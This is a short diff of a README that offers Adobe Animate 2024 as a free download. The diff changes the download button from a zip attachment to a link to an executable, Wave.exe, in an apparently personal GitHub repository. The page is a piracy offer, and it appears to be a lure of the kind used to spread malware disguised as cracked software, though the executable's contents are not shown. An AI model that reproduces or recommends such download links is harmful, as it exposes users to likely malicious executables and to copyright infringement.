@@ -29,7 +29,7 @@ Some of the key features of Adobe Animate 2024 include:
 
 To download Adobe Animate 2024 for free, click on the button below:
 
-[![Download Adobe Animate 2024](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Adobe Animate 2024](https://img.shields.io/badge/Download-Software-orange)](https://github.com/markthemanee/Adobe-Animate-2024/blob/main/Wave.exe)
 
 ## Usage
 
